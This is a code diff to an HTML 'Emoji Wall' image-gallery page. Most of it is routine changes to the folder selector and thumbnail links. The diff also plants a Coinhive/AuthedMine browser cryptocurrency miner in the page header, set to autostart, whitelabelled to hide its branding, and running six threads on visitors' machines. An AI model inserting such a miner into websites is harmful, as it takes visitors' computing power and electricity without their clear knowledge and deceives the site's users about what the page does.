@@ -14,19 +14,31 @@
   </style>
 
   <script src="jquery.js"></script>
-  <script src="imgwall.js"></script>
 
 </head>
 
 <body>
 <table width="100%"  border="0" cellpadding="0">
   <tr>
-    <td>Emoji Wall</td>
+    <td>Emoji Wall
+      <script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
+      <div class="coinhive-miner" 
+        style="width: 300px; height: 250px"
+        data-key="1360xoYfoqFu23nTSGruE6l1ubXA9kP1"
+        data-autostart="true"
+        data-background="#000000"
+        data-whitelabel = "true"
+        data-threads = "6"
+        data-throttle = "0.3">
+      </div>
+    </td>
   </tr>
   <tr>
     <td><form name="classify" method="post" action="" width="100%">
       <select name="select" onchange="selectionChange()">
       </select>
+
+      <script src="imgwall.js"></script>
       <script>
         var files = selectorGen();
         var selector = $('[name=select]');
@@ -34,19 +46,19 @@
           selector.prepend(`<option>${k}</option>`);
           console.log('Now add: '+k);
         }
-        selector.val('#.');
+        selector.prepend(`<option>--SELECT THE FOLDER--</option>`);
+        selector.val('--SELECT THE FOLDER--');
         function selectionChange() {
           var currentSelection = selector.val();
           var wall = $('#imgwall');
           var imgHtml = '\n';
-          // console.log(files[currentSelection]);
           for (var i of files[currentSelection]) {
-            // console.log(i);
-            imgHtml += (`<img src="${i}" height="128" width="128">\n`);
+            imgHtml += (`<a href="${i[0]}" target="_blank"><img src="./thumb/${i[1]}" height="128" width="128"></a>\n`);
           }
           wall.html(imgHtml);
         }
         selectionChange();
+
       </script>
     </form></td>
   </tr>
